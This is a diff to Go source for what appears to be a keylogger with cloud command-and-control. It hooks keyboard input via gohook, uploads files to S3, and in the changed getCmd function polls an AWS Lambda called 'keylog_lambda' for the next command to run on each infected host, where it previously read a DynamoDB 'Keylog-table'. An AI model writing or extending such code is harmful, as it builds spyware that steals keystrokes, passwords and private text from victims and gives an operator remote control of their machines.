@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"os"
 	"time"
+	"strings"
 	"encoding/json"
 	"github.com/robotn/gohook"
 	"github.com/joho/godotenv"
@@ -11,7 +12,7 @@ import (
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/session"
 	"github.com/aws/aws-sdk-go/service/s3"
-	"github.com/aws/aws-sdk-go/service/dynamodb"
+	//"github.com/aws/aws-sdk-go/service/dynamodb"
 	"github.com/aws/aws-sdk-go/service/lambda"
 )
 
@@ -26,6 +27,10 @@ type keylog_lambda struct {
 	Cmd        string `json:"cmd"`
 }
 
+type response struct {
+	StatusCode int    `'json:"statusCode"`
+	Body 	   string `'json:"body"`
+}
 
 func main() {
 
@@ -144,29 +149,39 @@ func uploadFile(fileName string, count int) error {
 
 func getCmd(hostName string) string {
 
-	svc := dynamodb.New(session.New())
-	input := &dynamodb.GetItemInput{
-		TableName: aws.String("Keylog-table"),
-		Key: map[string]*dynamodb.AttributeValue{
-			"hostName": {
-				S: aws.String(hostName),
-			},
-		},
+	sess := session.Must(session.NewSessionWithOptions(session.Options{
+		SharedConfigState: session.SharedConfigEnable,
+	}))
+	
+	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
+	request := keylog_lambda{
+		Function:   "get_cmd",
+		HostName: hostName,
+		Cmd:      "",
 	}
 
-	result, err := svc.GetItem(input)
+	payload, err := json.Marshal(request)
 	if err != nil {
 		panic(err)
 	}
 
-	cmd := result.Item["curr_cmd"]
-
-	return *cmd.S
+	result, err := client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
+	
+	var lambdaResp response
+	err = json.Unmarshal(result.Payload, &lambdaResp)
+	if err != nil {
+		panic(err)
+	}
+	
+	cmd := lambdaResp.Body
+	cmd = strings.Trim(cmd, `"`)
+	
+	return cmd
 
 }
 
 func putHost(hostName string) error {
-	
+
 	sess := session.Must(session.NewSessionWithOptions(session.Options{
 		SharedConfigState: session.SharedConfigEnable,
 	}))
